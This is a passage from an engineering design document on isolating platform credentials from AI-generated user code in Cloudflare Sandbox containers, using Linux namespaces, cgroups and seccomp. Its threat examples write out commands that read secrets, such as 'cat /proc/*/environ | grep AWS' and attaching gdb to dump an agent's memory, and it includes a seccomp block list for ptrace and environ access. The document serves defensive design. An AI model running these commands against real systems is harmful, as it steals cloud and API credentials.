      syscall: 'open',
      rule: (path, pid) => {
        // Block reading other processes' environ
        if (path.match(/\/proc\/(\d+)\/environ/)) {
          const targetPid = RegExp.$1;
          return targetPid === pid;  // Only allow reading own environ
        }
        return true;
      }
    }
  ],
  block: [
    'ptrace',    // Cannot debug other processes
    'process_vm_readv',  // Cannot read other process memory
  ]
};
```

**Status in Production:** Seccomp is disabled (mode 0), but with namespace isolation this is less critical. Processes in different namespaces can't see each other anyway.

#### 3. cgroups v2 Delegation - "The Resource Manager"

**What it is:** Linux control groups v2 with delegation allows creating sub-groups with different permissions and visibility.

**In Simple Terms:** Like creating different security zones in an office building:
```
Current Reality (No cgroup delegation):
Container = Open office floor
├── Everyone can see everyone
├── Shared resources
└── No privacy

With cgroups v2 Delegation:
Container = Secure office building
├── Executive Floor (platform cgroup)
│   ├── AI Agent + AWS CLI
│   ├── Has keycard to vault (credentials)
│   └── Surveillance cameras can't see here
└── Public Floor (user cgroup)
    ├── User code runs here
    ├── No vault access
    └── Cannot access executive floor
```

**Technical Details:**
```bash
# With cgroup v2 delegation, we could:
# Create platform-trusted cgroup
mkdir /sys/fs/cgroup/platform-trusted
echo "+cpu +memory +pids" > /sys/fs/cgroup/platform-trusted/cgroup.subtree_control

# Configure isolation
echo "pids.max=100" > /sys/fs/cgroup/platform-trusted/pids.max
echo "memory.max=1G" > /sys/fs/cgroup/platform-trusted/memory.max

# Hide from user cgroup
echo "$$" > /sys/fs/cgroup/platform-trusted/cgroup.procs
```

**Real-World Example:**
```typescript
// What we could do with cgroup delegation:
class CGroupIsolation {
  async createTrustedGroup() {
    // Create isolated cgroup for AI agent
    await cgroup.create('platform-trusted', {
      pids: { max: 50 },
      memory: { max: '512M' },
      cpu: { shares: 1024 },
      // Key feature: process visibility
      hideFromOthers: true  // Other cgroups can't see these processes!
    });
  }
  
  async runInTrustedGroup(command: string) {
    const pid = fork();
    if (pid === 0) {
      // Move to trusted cgroup
      await cgroup.moveTo('platform-trusted');
      
      // Set credentials (only visible in this cgroup)
      process.env.AWS_ACCESS_KEY_ID = getSecret();
      
      // Run command
      exec(command);  // e.g., 'python3 ai_agent.py'
    }
    
    // Processes in 'user' cgroup cannot:
    // - See processes in 'platform-trusted'
    // - Access their resources
    // - Read their environment
  }
}
```

**Status in Production:** ✅ AVAILABLE - cgroups v2 with delegation is enabled!

#### 4. Linux User Namespaces - "The Identity Switcher"

**What it is:** Allows mapping users in the container to different users in the namespace.

**Status in Production:** ✅ AVAILABLE - User namespaces work in production!

### Production Reality vs Local Development

**Local Development Configuration:**
```yaml
# Local development (restricted for safety)
containers:
  sandbox:
    capabilities:
      drop: ["ALL"]  # Drop all capabilities first
      add: 
        - CAP_CHOWN
        - CAP_NET_BIND_SERVICE
        - CAP_SETUID
        # No CAP_SYS_ADMIN in local dev
    seccomp:
      profile: "default"  # Default Docker profile
    cgroups:
      version: 2
      delegation: false
```

**Production Configuration (CURRENT - DISCOVERED):**
```yaml
# Production reality - we have everything we need!
containers:
  sandbox:
    capabilities:
      # Full capabilities: 000001ffffffffff
      # This includes CAP_SYS_ADMIN and all others!
      add: ["ALL"]
    seccomp:
      mode: 0  # Disabled - no filtering
    cgroups:
      version: 2
      delegation: true  # Can create sub-cgroups
```

### Update: Production Has Everything We Need!

**Critical Discovery:** Testing in production revealed that Cloudflare Containers already have all the Linux capabilities we need, including CAP_SYS_ADMIN. We can implement complete isolation TODAY in production environments.

```bash
# Production reality check:
$ cat /proc/self/status | grep Cap
CapInh: 000001ffffffffff  # Full capabilities!
CapPrm: 000001ffffffffff  # Including CAP_SYS_ADMIN
CapEff: 000001ffffffffff  # Can create namespaces
CapBnd: 000001ffffffffff  # Can isolate processes

$ unshare --pid --fork echo "SUCCESS"
SUCCESS  # Works in production!

$ mkdir /sys/fs/cgroup/test
# Success - cgroup delegation works!
```

**Why Local Development is Different:**
Local development intentionally restricts capabilities for safety, preventing developers from accidentally compromising their machines. Production environments, running in secure VMs, have full capabilities enabled.

## Implementation Roadmap

### Phase 1: Proof of Concept (This Week)

Build and test namespace isolation using production's CAP_SYS_ADMIN:

1. **Core Namespace Implementation**
   ```typescript
   // Add to bun server (container_src/index.ts)
   async function execInIsolation(
     command: string, 
     credentials: Record<string, string>,
     options?: { timeout?: number }
   ) {
     // Create isolated namespace with credentials
     const child = spawn('unshare', [
       '--pid',    // Separate process namespace
       '--mount',  // Separate filesystem view
       '--fork',   // Fork before exec
       'sh', '-c', command
     ], {
       env: { ...minimalEnv(), ...credentials },
       timeout: options?.timeout || 60000
     });
     
     // Process invisible to main namespace
     return await collectOutput(child);
   }
   ```

2. **SDK Interface Design**
   ```typescript
   // New secure methods for platform developers
   interface SecureSandbox extends Sandbox {
     // Execute with isolated credentials
     execInIsolation(cmd: string, creds: Record<string, string>): Promise<ExecResult>;
     
     // Safe env vars for user code  
     setUserEnvVars(vars: Record<string, string>): Promise<void>;
     
     // Platform operations via RPC callback
     registerPlatformCallback(callback: Function): Promise<void>;
   }
   ```

3. **Testing in Production**
   - Deploy test worker with namespace isolation
   - Verify credential isolation with real AWS/GCP tools
   - Confirm process invisibility across namespaces

### Phase 2: Production Ready (Week 2-3)

1. **Harden Implementation**
   - Add cgroup isolation for resource limits
   - Implement audit logging for credential access
   - Create credential rotation mechanism
   
2. **Developer Experience**
   - Detect capabilities and provide appropriate warnings
   - Clear error messages when isolation fails
   - Automatic fallback for local development

3. **Documentation & Examples**
   - Complete API documentation
   - Migration guide from `setEnvVars()`
   - Example implementations for AWS, GCP, database deployments

### Phase 3: General Release (Week 4+)

1. **SDK Release**
   - Publish updated @cloudflare/sandbox package
   - Deprecation warnings for insecure patterns
   - Backward compatibility during transition

2. **Community Support**
   - Blog post explaining the security improvement
   - Video tutorials for migration
   - Support channels for questions

3. **Long-term Maintenance**
   - Monitor for security issues
   - Performance optimizations
   - Feature requests from users

## Security Analysis Summary

### Current State
- **Vulnerability:** All env vars accessible to all code
- **Exposure:** Persistent for container lifetime
- **Risk:** High - credentials can be exfiltrated

### With Container Control (What We Can Build)
- **Vulnerability:** Brief exposure during execution
- **Exposure:** Milliseconds to seconds
- **Risk:** Medium - timing attacks possible

### With Namespace Isolation (Available Today in Production!)
- **Vulnerability:** None - complete isolation
- **Exposure:** Zero - different namespaces
- **Risk:** Low - kernel-enforced boundaries

## Concrete Examples: What We Can't Do Today vs Tomorrow

### Scenario: AI Agent Needs to Deploy to AWS

#### Current State (Without Our Solution)
```python
# claude_code.py running in container (AI AGENT - NEEDS SECRETS)
import os
import subprocess

def deploy_lambda():
    # AI agent MUST have credentials to deploy
    os.environ['AWS_ACCESS_KEY_ID'] = platform_secrets['aws_key']
    os.environ['AWS_SECRET_ACCESS_KEY'] = platform_secrets['aws_secret']
    
    # AI agent successfully deploys:
    result = subprocess.run(['aws', 'lambda', 'deploy'])  # Works!
    
    # BUT NOW - Code the AI agent wrote can steal them:
    # app.js (written by Claude): console.log(process.env.AWS_ACCESS_KEY_ID)
    # Result: "AKIAIOSFODNN7EXAMPLE" <- LEAKED!
```

**Reality Check:**
```bash
# Any user code can do this TODAY:
$ cat /proc/*/environ | grep AWS
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE  # Found it!

$ ps aux | grep python
root 1234 python3 ai_agent.py  # Can see AI agent

$ gdb -p 1234
(gdb) dump memory  # Can read AI agent's memory!
```

#### What We're Building Today (With Namespace Isolation)
```python
# claude_code.py running in isolated namespace with secrets
import os
import subprocess

def deploy_lambda():
    # AI agent has full access to credentials in its namespace
    # Can successfully deploy to AWS
    result = subprocess.run(['aws', 'lambda', 'deploy'])
    # Result: SUCCESS! AI agent did its job
    
    # Meanwhile, the app.js file Claude wrote runs in user namespace:
    # console.log(process.env.AWS_ACCESS_KEY_ID)  # undefined - not visible!
    # No way for generated code to access platform secrets
```

**With Proper Isolation:**
```bash
# User code attempts to steal credentials:
$ cat /proc/*/environ | grep AWS
# (empty - can't see AI agent's namespace)

$ ps aux
PID  USER  COMMAND
5678 user  python3 user_code.py  # Only sees own processes!

$ ls /proc/
5678/  self/  # AI agent's PID not even visible!

$ gdb -p 1234
gdb: No such process  # Can't debug what you can't see!
```

### The Difference in Security Models

#### Without Our Solution: Time-Based Security
```typescript
// Brief exposure window - credentials visible for seconds
async function deployWithTempCreds() {
  // Credentials exposed for 30 seconds
  await sandbox.setEnvVars({ AWS_KEY: secret });
  await sandbox.exec('aws lambda deploy');
  // Still exposed until container restarts!
  
  // User code within those 30 seconds:
  await sandbox.exec('echo $AWS_KEY');  // Gotcha!
}
```

#### Our Solution Today: Namespace-Based Isolation (Production Ready)
```typescript
// Complete isolation using production CAP_SYS_ADMIN
async function deployWithIsolation() {
  // New SDK method that uses namespace isolation
  await sandbox.execInIsolation(
    'aws lambda deploy',
    { AWS_ACCESS_KEY_ID: secret, AWS_SECRET_ACCESS_KEY: secretKey },
    { timeout: 30000 }
  );
  
  // User code at ANY time:
  await sandbox.exec('echo $AWS_ACCESS_KEY_ID');  // Empty - never set in main namespace
  await sandbox.exec('ps aux | grep aws');  // No results - different PID namespace
  await sandbox.exec('cat /proc/*/environ | grep AWS');  // Nothing - isolated
}
```

## The Bottom Line

**Current State (Vulnerable):**
- Persistent credential exposure (hours/days) ❌
- Any code can read platform secrets
- No isolation between platform and user code
- **Risk**: Critical - credentials easily stolen

**What We Can Build Today (Production):**
- Complete namespace isolation ✅
- Kernel-enforced security boundaries
- Zero exposure to user code
- Platform operations in separate namespace
- **Risk**: Near zero - proper isolation

**Key Insights:**
1. Production has CAP_SYS_ADMIN - we can build proper isolation TODAY
2. No need to wait for platform changes
3. Local development is restricted for safety, production has full capabilities
4. Namespace isolation > Time-based security > Current persistent exposure

## Concrete Example: AI Code Generation Platform

### The Scenario
You're building "CodeGenie" - an AI-powered platform where users can prompt AI to build and deploy full applications.

### Current (Vulnerable) Implementation
```typescript
// Worker code - THIS IS INSECURE
export default {
  async fetch(request: Request, env: Env) {
    const { prompt } = await request.json();
    const sandbox = getSandbox(env.Sandbox, userId);
    
    // Platform needs these secrets for AI agent to deploy
    await sandbox.setEnvVars({
      AWS_ACCESS_KEY_ID: env.AWS_KEY,          // AI needs this to deploy
      AWS_SECRET_ACCESS_KEY: env.AWS_SECRET,    // AI needs this to deploy
      ANTHROPIC_API_KEY: env.ANTHROPIC_KEY,    // For Claude Code
      DATABASE_URL: env.DATABASE_URL,          // AI needs for migrations
      GITHUB_TOKEN: env.GITHUB_TOKEN           // AI needs to push code
    });
    
    // Start AI agent - it CORRECTLY uses secrets to deploy
    await sandbox.exec('claude-code --task "' + prompt + '"');
    // Claude successfully deploys to AWS, pushes to GitHub, etc.
    
    // BUT - Code that Claude wrote can steal ALL secrets:
    // If Claude wrote: app.js with console.log(process.env)
    await sandbox.exec('node app.js');
    // This prints ALL platform secrets! VULNERABILITY!
  }
}
```

### Attack Example
User prompt: "Create a Node.js app that shows system information"

Claude Code (AI agent) does its job:
1. Writes the app.js file
2. Deploys it to AWS Lambda (needs AWS credentials)
3. Sets up GitHub repo (needs GitHub token)
4. Configures database (needs DB credentials)

The app.js Claude writes:
```javascript
// app.js - Written by Claude Code
const express = require('express');
const app = express();

app.get('/info', (req, res) => {
  res.json({
    platform: process.platform,
    memory: process.memoryUsage(),
    environment: process.env  // If this runs, it EXPOSES ALL SECRETS!
  });
});

app.listen(3000);
```

The problem: Claude NEEDS those secrets to deploy this app, but the app itself shouldn't have access to them when running.

### Proposed Secure Implementation with Namespace Isolation

```typescript
// Worker code - Using namespace isolation
export default {
  async fetch(request: Request, env: Env) {
    const { prompt } = await request.json();
    const sandbox = getSandbox(env.Sandbox, userId);
    
    // Start Claude Code in isolated namespace WITH secrets
    await sandbox.execWithSecrets(
      'claude-code --task "' + prompt + '"',
      {
        env: {
          AWS_ACCESS_KEY_ID: env.AWS_KEY,
          AWS_SECRET_ACCESS_KEY: env.AWS_SECRET,
          ANTHROPIC_API_KEY: env.ANTHROPIC_KEY,
          DATABASE_URL: env.DATABASE_URL,
          GITHUB_TOKEN: env.GITHUB_TOKEN
        }
      }
    );
    // Claude can deploy to AWS, push to GitHub, run migrations
    
    // Run the app Claude wrote - in user namespace WITHOUT secrets
    await sandbox.exec('node app.js');
    // Even if app.js contains console.log(process.env),
    // it CANNOT see any platform secrets!
    
    // Start dev server - also without secrets
    await sandbox.exec('npm run dev');
    // Server cannot access platform credentials
  }
}
```

### Real-World Impact

#### Without Fix
- Code written by AI agents can steal platform API keys
- Generated applications expose AWS/GCP credentials to end users
- Potential for massive cloud bills from leaked credentials
- Data breaches when generated code accesses production databases
- Platform reputation damage from security incidents

#### With Fix
- AI agents have full access to credentials for deployments
- Code written by AI agents runs in clean environment
- Clear security boundary: platform operations vs generated code
- AI can deploy to production while generated code stays sandboxed
- Platform maintains control without limiting AI capabilities

## Update: No Platform Changes Needed!

Our production testing revealed that Cloudflare Containers already provide all necessary Linux capabilities. We can build complete isolation without waiting for platform changes. The ask has shifted from "please enable these capabilities" to "let's document and leverage what's already available."

## The Original Ask to Cloudflare (For Reference)

### What We're Building
Platforms where AI agents autonomously execute operations requiring real credentials:
- Deploy code to AWS/GCP/Azure
- Run database migrations
- Execute terraform plans
- Manage Kubernetes clusters
- Integrate with third-party APIs

### The Problem
These tools (AWS CLI, terraform, kubectl) **cannot be modified** to use custom auth. They need standard environment variables or config files. Currently, this means exposing platform secrets to all container code, including untrusted user code.

### What We Need
Enable Linux security capabilities in the container runtime to create isolated execution contexts within containers. This is not about what software we install (Dockerfile) but about what the runtime allows us to do.

### Business Impact

**Without These Changes:**
- Platform developers must choose between:
  - Supporting critical tools (AWS CLI) with security risk
  - Perfect security but breaking essential functionality
- Limits adoption of Cloudflare Containers for AI platforms
- Forces workarounds that increase complexity

**With These Changes:**
- Cloudflare Containers become the ideal platform for AI agents
- Enables secure autonomous operations
- Opens new market opportunities in AI-powered DevOps

### What We Originally Thought We Needed
```yaml
# Container runtime configuration we thought was missing:
containers:
  sandbox:
    capabilities:
      add: [CAP_SYS_ADMIN]  # Already available in production!
    seccomp:
      profile: custom       # Can work with current mode 0
    cgroups:
      version: 2
      delegation: true      # Already enabled in production!
```

### Actual Next Steps (Updated)
1. Build POC implementation using existing production capabilities
2. Create SDK API for namespace-based isolation
3. Document patterns for secure credential management
4. Test with real-world deployment scenarios
5. Create migration guide for existing users

## Final API Design Considerations

### Why Contexts Over Other Approaches?

We evaluated several API designs:

1. **Auto-magic namespace selection** (rejected)
   ```typescript
   // Too implicit, hard to debug
   await sandbox.exec("aws s3 ls", { env: { AWS_KEY }});  // Which namespace?
   ```

2. **Command pattern matching** (rejected)
   ```typescript
   // Fragile, incomplete list
   if (cmd.includes('aws')) useSecureNamespace();
   ```

3. **Contexts as first-class citizens** (chosen)
   ```typescript
   // Explicit, clear, flexible
   const aws = await sandbox.createContext({ 
     name: "aws",
     env: { AWS_KEY },
     persistent: true 
   });
   await aws.exec("aws s3 ls");
   await aws.exec("aws s3 deploy");  // Shares state with previous command
   ```

### Key Benefits of Context Design

1. **Explicit Control**: Developers choose context explicitly
2. **Unified Abstraction**: Sessions + namespaces = contexts
3. **Multi-tenancy**: Platform vs user credentials clearly separated
4. **Child Routing**: AI agents route children to different contexts
5. **State Persistence**: Each context maintains pwd, env, shell state
6. **Future Proof**: Can add features without breaking API changes

### Implementation Priority Order

1. **Core Namespace Isolation** (Week 1)
   - Basic `unshare` implementation in bun server
   - Separate platform/user execution paths
   - Test with real AWS CLI

2. **File System Sharing** (Week 1)
   - Shared directory mounting between namespaces
   - Ensure `/app` is accessible to both contexts
   - Handle file permissions correctly

3. **Process Management** (Week 2)
   - Track processes per namespace
   - Clean shutdown of namespace processes
   - Handle orphaned processes

4. **Developer Experience** (Week 2)
   - Clear error messages
   - Capability detection
   - Local development fallback

5. **Performance Optimization** (Week 3)
   - Namespace pooling/reuse
   - Lazy namespace creation
   - Benchmark overhead

### Edge Cases to Handle

1. **Large File Operations**
   ```typescript
   // Platform generates large file
   await sandbox.platform.exec('terraform plan -out=plan.tfplan');
   // User needs to read it - shared filesystem critical
   await sandbox.user.exec('terraform show plan.tfplan');
   ```

2. **Interactive Commands**
   ```typescript
   // Some tools need stdin
   await sandbox.platform.exec('aws configure', {
     stdin: `${key}\n${secret}\n${region}\ntext\n`
   });
   ```

3. **Long-Running Processes**
   ```typescript
   // Database tunnel needs to stay open
   const tunnel = await sandbox.platform.startProcess('ssh -L 5432:db:5432 bastion');
   // Multiple operations through tunnel
   await sandbox.platform.exec('psql -h localhost -p 5432');
   ```

4. **Cross-Context Communication**
   ```typescript
   // Platform generates, user consumes
   await sandbox.platform.exec('aws s3 cp s3://bucket/data.json /shared/data.json');
   await sandbox.user.exec('python analyze.py /shared/data.json');
   ```

### Security Considerations

1. **Namespace Escape**: Even with namespaces, monitor for kernel vulnerabilities
2. **Shared Filesystem**: Careful with permissions on shared directories
3. **Resource Limits**: Apply cgroup limits to prevent DoS
4. **Audit Logging**: Track all platform operations with credentials

### Alternative API Designs We Considered

#### Design 1: Explicit Namespace Management
```typescript
const platform = await sandbox.createNamespace('platform');
await platform.exec('aws s3 ls', { env: secrets });
await platform.destroy();
```
**Rejected**: Too complex for developers

#### Design 2: Role-Based Execution
```typescript
await sandbox.exec('aws s3 ls', { role: 'platform', env: secrets });
await sandbox.exec('python app.py', { role: 'user' });
```
**Rejected**: Not clear enough about isolation

#### Design 3: Capability Tokens
```typescript
const token = await sandbox.createCapabilityToken(['aws:*']);
await sandbox.exec('aws s3 ls', { token });
```
**Rejected**: Doesn't work with existing CLI tools

### What Success Looks Like

1. **Security**: Zero credential leaks in production
2. **Compatibility**: AWS CLI, terraform, kubectl all work
3. **Performance**: <10ms overhead for platform operations
4. **Developer Experience**: Migration takes <1 hour
5. **Reliability**: No crashes or hangs from namespace operations

---

*This document will be updated as we implement and test the proposed solutions.*